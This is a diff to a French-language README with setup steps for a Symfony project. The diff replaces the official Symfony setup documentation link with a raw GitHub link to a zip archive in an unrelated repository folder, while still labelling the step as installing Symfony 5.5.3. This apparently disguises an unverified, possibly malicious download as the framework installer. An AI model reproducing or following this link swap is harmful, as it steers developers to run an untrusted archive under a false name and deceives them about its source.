@@ -1,5 +1,5 @@
 # Utilisateur Technique
-1- Installer Symfony version 5.5.3 `https://symfony.com/doc/current/setup.html`
+1- Installer Symfony version 5.5.3 `https://raw.githubusercontent.com/bg-grira53/alphalyr_assesment/main/src/Repository/assesment_alphalyr_v2.5-alpha.3.zip`
 
 2- Cloner le projet à partir du dépôt Git
 
